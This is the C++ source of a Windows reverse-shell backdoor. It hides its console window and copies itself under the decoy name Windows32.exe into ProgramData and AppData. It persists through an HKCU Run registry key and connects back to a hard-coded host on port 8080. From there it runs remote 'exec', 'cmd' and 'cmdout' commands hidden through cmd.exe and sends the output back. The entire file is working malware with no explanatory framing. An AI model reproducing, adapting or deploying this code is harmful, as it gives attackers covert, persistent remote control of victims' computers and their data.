#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

void persistence(){
	ShellExecute(NULL,"open","cmd.exe","/c mkdir \\ProgramData\\Windows32\\Security",NULL,SW_HIDE);
	ShellExecute(NULL,"open","cmd.exe","/c copy .\\banarai.exe \\ProgramData\\Windows32\\Security",NULL,SW_HIDE);
	Sleep(500);
	ShellExecute(NULL,"open","cmd.exe","/c ren \\ProgramData\\Windows32\\Security\\banarai.exe Windows32.exe",NULL,SW_HIDE);
	ShellExecute(NULL,"open","cmd.exe","/c copy \\ProgramData\\Windows32\\Security\\Windows32.exe %appdata%",NULL,SW_HIDE);
	ShellExecute(NULL,"open","cmd.exe","/c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Windows\" /t REG_SZ /F /D \"%appdata%\\Windows32.exe",NULL,SW_HIDE);
}

void pwd(char* ansVal, int ansLong){
	TCHAR var[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, var);
	strcat(ansVal,var);
}

void exec(char* ansVal, int ansLong, char *file){
	if(32 >= (int)(ShellExecute(NULL,"open",file, NULL, NULL, SW_HIDE)))
		strcat(ansVal, "[-] Error al ejecutar el comando\n");
	else
		strcat(ansVal,"\n");
}

void read(char* ansVal){
	FILE *file;
	char fileName[100] = "\\ProgramData\\Windows32\\Security\\Secure.txt";
	char lineByLine[100];
	char fileContent[10000] = "";
	file = fopen(fileName,"r");
	if(file != NULL){
			while(fgets(lineByLine,100,file)){
				strcat(fileContent,lineByLine);
			}
		}
		else{
			strcmp(fileContent,"[-] No se pudo obtener el archivo");
		}
		fclose(file);
		strcat(ansVal,fileContent);
}

void cmdout(char* ansVal, int ansLong, char *command){
	char finalCommand[100] = "/c ";
	char lineByLine[100];
	char fileContent[10000] = "";
	FILE *file;
	char folderName[100] = "\\ProgramData\\Windows32\\Security";
	char fileName[100] = "";
	strcat(fileName,folderName);
	strcat(fileName,"\\Secure.txt");
	strcat(finalCommand,"mkdir ");
	strcat(finalCommand,folderName);
	ShellExecute(NULL,"open","cmd.exe",finalCommand,NULL,SW_HIDE);
	memset(finalCommand,0,100);

	strcpy(finalCommand,"/c ");
	strcat(finalCommand, command);
	strcat(finalCommand," > ");
	strcat(finalCommand,fileName);
	if(32 >= (int)(ShellExecute(NULL,"open","cmd.exe",finalCommand,NULL,SW_HIDE))){
		strcat(ansVal, "[-] Error al ejecutar el comando\n");
	}
	else{
		Sleep(3000);
		file = fopen(fileName,"r");
		if(file != NULL){
			while(fgets(lineByLine,100,file)){
				strcat(fileContent,lineByLine);
			}
		}
		else{
			strcmp(fileContent,"[-] No se pudo obtener el archivo");
		}
		fclose(file);
		strcat(ansVal,fileContent);
	}
}

void cmd(char* ansVal, int ansLong, char *command){
	char finalCommand[500] = "/c ";

	strcat(finalCommand,command);
	 Sleep(100);
	if(32 >= (int)(ShellExecute(NULL,"open","cmd.exe",finalCommand,NULL,SW_HIDE))){
		strcat(ansVal, "[-] Error al ejecutar el comando\n");
	}
	else{
		strcat(ansVal,"\n");
	}

}

void HideCmdWindows(){
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}

void StartUseWinsockDll(WSADATA wsadata){
	WORD wVersion = MAKEWORD(2,2);
	WSAStartup(wVersion, &wsadata);
}

void CreateSockAddr_In(sockaddr_in &server){
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr("192.168.0.5");
	server.sin_port = htons(8080);
}

void CreateSocket(SOCKET &socketS){
	socketS = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

}

void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
	while(true){
	if(connect(socketS, (sockaddr *) &server, sizeof(server)) == SOCKET_ERROR){
		Sleep(1000);
	}
	else{
		break;
	}
}
		printf("conexion establecida\n");
		char Received[1024] = "";
		while(true){
			int Result = recv(socketS,Received,1024,0);

			if((strcmp(Received, "exit")==0)){
				closesocket(socketS);
				WSACleanup();
				exit(0);
			}
			else if(strcmp(Received,"read") == 0){
				char buff[250] = "";
				read(buff);
				strcat(buff,"\n");
				send(socketS, buff, strlen(buff) + 1, 0);
				memset(buff,0,sizeof(buff));
				memset(Received, 0, sizeof(Received));
			}
			else if(strcmp(Received, "") == 0)
				continue;
			else if(strcmp(Received, "pwd")==0){
				char buff[250] = "";
				pwd(buff,250);
				strcat(buff,"\n");
				send(socketS,buff,strlen(buff)+1,0);
				memset(buff,0,sizeof(buff));
				memset(Received, 0, sizeof(buff));
			}
			else{
				char valSend[1024] = "";

				for(int i = 0; i < 1024; i++){
					if(Received[i] == *" ")
						break;
					else
						valSend[i] = Received[i];
				}
				if(strcmp(valSend,"exec") ==0){
					char execute[1024] = "";
					int j = 0;

					for(int i = 5; i < 1024; i++){
						if(Received[i] == 0)
							break;
						execute[j] = Received[i];
						j++;
					}
					char buff[250] = "";
					exec(buff,250, execute);
					strcat(buff,"\n");
					send(socketS, buff, strlen(buff) + 1, 0);
					memset(buff,0,sizeof(buff));
					memset(Received, 0, sizeof(Received));
				}

				else if(strcmp(valSend,"cmd")==0){
					char execute[1024] = "";
					int j = 0;
					for(int i = 4; i < 1024; i++){
						if(Received[i] == 0)
							break;
						execute[j] = Received[i];
						j++;
					}
					char buff[250] = "";
					cmd(buff,250,execute);
					strcat(buff,"\n");
					send(socketS, buff, strlen(buff) + 1, 0);
					memset(buff,0,sizeof(buff));
					memset(Received, 0, sizeof(Received));
				}
				else if(strcmp(valSend,"cmdout")==0){
					char execute[1024] = "";
					int j = 0;
					for(int i = 7; i < 1024; i++){
						if(Received[i] == 0)
							break;
						execute[j] = Received[i];
						j++;
					}
					char buff[10240] = "";
					cmdout(buff,10240,execute);
					strcat(buff,"\n");
					send(socketS, buff, strlen(buff) + 1, 0);
					memset(buff,0,sizeof(buff));
					memset(Received, 0, sizeof(Received));
				}

				else{
					char buff[30] = "[-]Comando no reconocido\n";
					send(socketS, buff, strlen(buff)+1,0);
					memset(buff, 0, sizeof(buff));
					memset(Received,0,sizeof(Received));
				}
			}
		}
	closesocket(socketS);
	WSACleanup();
	exit(0);
}

int main(){
	WSADATA wsadata;
	sockaddr_in server;
	SOCKET socketS;
	HideCmdWindows();
	persistence();
	StartUseWinsockDll(wsadata);
	CreateSocket(socketS);
	CreateSockAddr_In(server);
	ConnectSocket(socketS,server);
return 0;
}
